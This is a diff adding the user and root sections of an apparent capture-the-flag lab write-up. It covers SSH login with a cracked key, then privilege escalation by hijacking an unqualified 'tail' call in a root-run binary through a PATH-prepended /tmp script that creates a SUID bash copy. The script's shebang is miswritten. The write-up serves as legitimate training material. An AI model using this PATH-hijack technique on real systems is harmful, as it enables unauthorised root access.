@@ -166,5 +166,57 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ## User
 
+Now we can login as Barry with his password and get our first flag!
+
+```bash
+ssh barry@10.10.68.59 -i id_rsa
+```
+
+![image](https://user-images.githubusercontent.com/5285547/121748244-8bc03480-cb00-11eb-8825-a385e9074344.png)
+
+![image](https://user-images.githubusercontent.com/5285547/121748305-a2ff2200-cb00-11eb-93b9-6c121b69bcc1.png)
+
+## Root
+
+Looking arond the system I found a strange file in Joe's home file (ELF) called "live_log", 
+I check it with strings to see what it maybe doing.
+We can see the tail binary being called but its path is not absolute! Runnig the file
+
+![image](https://user-images.githubusercontent.com/5285547/121748473-f1acbc00-cb00-11eb-89a4-f9b57c88396c.png)
+
+```
+./live_log
+```
+I checked the system process's. The file was being ran as root.
+
+Knowing a file can be abused using path manipulation, I set about making a file that would be ran when the "live_log" was run. 
+
+```bash
+cd /tmp
+```
+```bash
+nano tail
+#/!bin/bash
+cp /bin/bash /tmp/b
+chmod u+s /tmp/b
+```
+
+Save the file and then enter the next comamnds so we can run the executable. Then set the path to /tmp first to call our file before the real tail file. 
+```bash
+chmod +x tail
+export PATH=/tmp:$PATH
+```
+
+Now we can run and get our last flag.
+```bash
+/tmp/b -p
+```
+
+![image](https://user-images.githubusercontent.com/5285547/121749233-3ab14000-cb02-11eb-9d97-5d8f5f3d6688.png)
+
+
+Thanks and happy hacking! :)
+
+
 
 
